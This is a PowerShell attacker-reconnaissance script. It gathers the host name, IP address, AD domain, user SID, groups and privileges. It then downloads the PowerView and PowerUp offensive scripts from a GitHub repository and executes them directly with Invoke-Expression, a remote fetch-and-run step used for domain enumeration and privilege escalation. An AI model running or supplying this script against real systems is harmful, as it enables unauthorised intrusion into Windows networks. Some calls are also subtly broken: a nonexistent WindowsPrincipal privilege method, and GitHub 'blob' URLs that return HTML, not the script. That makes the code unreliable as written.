# Get computer name, local IP address, and domain
$computerName = $env:COMPUTERNAME
$localIP = (Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -like 'Wi-Fi'}).IPAddress
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name

# Get current user name, SID, and group memberships
$windowsIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$userName = $windowsIdentity.Name
$sid = $windowsIdentity.User.Value
$groups = $windowsIdentity.Groups | ForEach-Object {$_.Translate([System.Security.Principal.NTAccount]).Value}

# Get current user privileges
$principal = [System.Security.Principal.WindowsPrincipal]::new($windowsIdentity)
$privileges = $principal.GetEffectiveRightsAndPermissions('').Privileges | ForEach-Object {$_.DisplayName}

Write-Host "Hostname: $computerName"
Write-Host "Domain: $domain"
Write-Host "Local IP address: $localIP"
Write-Host "Current user: $userName"
Write-Host "SID: $sid"
Write-Host "Groups:`n$($groups -join "`n")"
Write-Host "Privileges:`n$($privileges -join "`n")"

# Import powerview and powerup scripts from GitHub repository
$scriptDir = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(".\")
try {
    $powerviewContent = Invoke-WebRequest -Uri "https://github.com/conma293/mvp/blob/main/powerview.ps1" -UseBasicParsing -ErrorAction Stop
    Invoke-Expression $powerviewContent.Content
    Write-Host "Powerview loaded successfully"
}
catch {
    Write-Host "Could not load powerview"
}

try {
    $powerupContent = Invoke-WebRequest -Uri "https://github.com/conma293/mvp/blob/main/powerup.ps1" -UseBasicParsing -ErrorAction Stop
    Invoke-Expression $powerupContent.Content
    Write-Host "Powerup loaded successfully"
}
catch {
    Write-Host "Could not load powerup"
}
